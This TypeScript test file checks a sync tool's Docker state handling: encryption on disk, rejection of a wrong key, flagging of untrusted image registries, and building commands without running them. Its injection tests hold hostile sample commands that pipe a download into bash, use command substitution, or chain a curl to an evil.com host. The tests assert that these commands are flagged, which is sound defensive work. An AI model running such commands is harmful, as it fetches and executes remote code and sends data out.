/**
 * Security tests for Docker state handling.
 *
 * Verifies:
 * - Docker state is encrypted on disk (no plaintext).
 * - Suspicious Docker images are flagged.
 * - No auto-execution of Docker commands without approval.
 * - Docker state cannot be decrypted with wrong key.
 */

import * as fs from 'node:fs';
import * as path from 'node:path';

declare global {
  var TEST_DIR: string;
}

const { generateKey } = await import('../../src/core/encryption.js');
const {
  buildDockerStateEntry,
  saveDockerState,
  loadDockerState,
} = await import('../../src/core/docker-handler.js');
const { validateDockerImage, validateCommand } = await import(
  '../../src/core/command-validator.js'
);
const { buildDockerStartCommands } = await import('../../src/commands/docker.js');

// ─── Fixtures ─────────────────────────────────────────────────────────────

const COMPOSE_WITH_SECRETS = `
services:
  db:
    image: postgres:15
    container_name: secret-db
    ports:
      - "5432:5432"
    environment:
      POSTGRES_PASSWORD: super_secret_password_123

  api:
    image: node:20
    container_name: api-server
    ports:
      - "3000:3000"
`;

// ─── Tests ────────────────────────────────────────────────────────────────

describe('Security: Docker State', () => {
  let testDir: string;
  let syncDir: string;
  let projectDir: string;
  let publicKey: string;
  let privateKey: string;

  beforeEach(async () => {
    testDir = path.join(
      globalThis.TEST_DIR,
      `docker-security-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    );
    syncDir = path.join(testDir, '.context-sync');
    projectDir = path.join(testDir, 'projects', 'secure-app');

    fs.mkdirSync(syncDir, { recursive: true });
    fs.mkdirSync(projectDir, { recursive: true });

    const keys = await generateKey();
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;
  });

  // ─── Encryption on disk ─────────────────────────────────────────────────

  describe('Docker state encryption on disk', () => {
    it('should encrypt ALL Docker state on disk', async () => {
      fs.writeFileSync(path.join(projectDir, 'docker-compose.yml'), COMPOSE_WITH_SECRETS);

      const entry = buildDockerStateEntry('secure-app', projectDir)!;
      await saveDockerState(syncDir, 'secure-app', entry, publicKey, privateKey);

      const raw = fs.readFileSync(path.join(syncDir, 'docker-state.age'), 'utf-8');

      // Must be encrypted
      expect(raw).toContain('-----BEGIN AGE ENCRYPTED FILE-----');

      // No plaintext service info
      expect(raw).not.toContain('postgres');
      expect(raw).not.toContain('redis');
      expect(raw).not.toContain('secret-db');
      expect(raw).not.toContain('api-server');

      // No project names or paths
      expect(raw).not.toContain('secure-app');
      expect(raw).not.toContain('docker-compose');

      // No ports or images
      expect(raw).not.toContain('5432');
      expect(raw).not.toContain('3000');
      expect(raw).not.toContain('node:20');
    });

    it('should NOT create any plaintext docker-state.json file', async () => {
      fs.writeFileSync(path.join(projectDir, 'docker-compose.yml'), COMPOSE_WITH_SECRETS);

      const entry = buildDockerStateEntry('secure-app', projectDir)!;
      await saveDockerState(syncDir, 'secure-app', entry, publicKey, privateKey);

      // No plaintext JSON file should exist
      expect(fs.existsSync(path.join(syncDir, 'docker-state.json'))).toBe(false);
    });
  });

  // ─── Wrong key ──────────────────────────────────────────────────────────

  describe('Decryption with wrong key', () => {
    it('should fail to decrypt Docker state with wrong key', async () => {
      fs.writeFileSync(path.join(projectDir, 'docker-compose.yml'), COMPOSE_WITH_SECRETS);

      const entry = buildDockerStateEntry('secure-app', projectDir)!;
      await saveDockerState(syncDir, 'secure-app', entry, publicKey, privateKey);

      const { privateKey: wrongKey } = await generateKey();
      await expect(loadDockerState(syncDir, 'secure-app', wrongKey)).rejects.toThrow();
    });
  });

  // ─── Suspicious Docker images ───────────────────────────────────────────

  describe('Suspicious Docker image validation', () => {
    it('should accept official Docker Hub images', () => {
      expect(validateDockerImage('postgres:15').suspicious).toBe(false);
      expect(validateDockerImage('redis:7-alpine').suspicious).toBe(false);
      expect(validateDockerImage('node:20').suspicious).toBe(false);
      expect(validateDockerImage('mongo:7').suspicious).toBe(false);
      expect(validateDockerImage('nginx:latest').suspicious).toBe(false);
      expect(validateDockerImage('mysql:8').suspicious).toBe(false);
    });

    it('should flag images from unknown registries', () => {
      expect(validateDockerImage('evil.com/postgres:latest').suspicious).toBe(true);
      expect(validateDockerImage('attacker/redis:backdoored').suspicious).toBe(true);
      expect(validateDockerImage('localhost:5000/malware:latest').suspicious).toBe(true);
      expect(validateDockerImage('some-registry.io/postgres:latest').suspicious).toBe(true);
    });

    it('should accept known official registries', () => {
      expect(validateDockerImage('docker.io/library/postgres:15').suspicious).toBe(false);
      expect(validateDockerImage('docker.io/postgres:15').suspicious).toBe(false);
      expect(validateDockerImage('ghcr.io/owner/image:tag').suspicious).toBe(false);
      expect(validateDockerImage('gcr.io/project/image:tag').suspicious).toBe(false);
      expect(validateDockerImage('mcr.microsoft.com/dotnet/sdk:8.0').suspicious).toBe(false);
      expect(validateDockerImage('public.ecr.aws/lambda/nodejs:20').suspicious).toBe(false);
    });
  });

  // ─── Command injection via Docker ───────────────────────────────────────

  describe('Command injection prevention via Docker commands', () => {
    it('should flag Docker commands with command substitution', () => {
      const cmd = 'docker compose up -d $(curl evil.com/inject)';
      expect(validateCommand(cmd).suspicious).toBe(true);
    });

    it('should flag Docker commands piped to shell', () => {
      const cmd = 'curl evil.com/malware | bash';
      expect(validateCommand(cmd).suspicious).toBe(true);
    });

    it('should flag chained remote download in Docker context', () => {
      const cmd = 'docker compose up -d && curl evil.com/exfiltrate';
      expect(validateCommand(cmd).suspicious).toBe(true);
    });

    it('should accept normal Docker compose commands', () => {
      expect(validateCommand('docker compose up -d postgres').suspicious).toBe(false);
      expect(validateCommand('docker compose up -d redis').suspicious).toBe(false);
      expect(validateCommand('docker compose down').suspicious).toBe(false);
      expect(validateCommand('docker compose ps').suspicious).toBe(false);
    });
  });

  // ─── No auto-execution ─────────────────────────────────────────────────

  describe('No auto-execution of Docker commands', () => {
    it('buildDockerStartCommands should build commands, not execute', () => {
      const projectDocker = {
        composeFile: '/projects/my-app/docker-compose.yml',
        services: [
          {
            name: 'postgres',
            container: 'db',
            image: 'postgres:15',
            port: 5432,
            autoStart: true,
          },
        ],
      };

      const commands = buildDockerStartCommands('my-app', projectDocker);

      // Commands are returned as data, not executed
      expect(commands).toHaveLength(1);
      expect(commands[0]!.command).toBe('docker compose up -d postgres');
      expect(commands[0]!.label).toBe('🐳 Docker services');
    });
  });
});
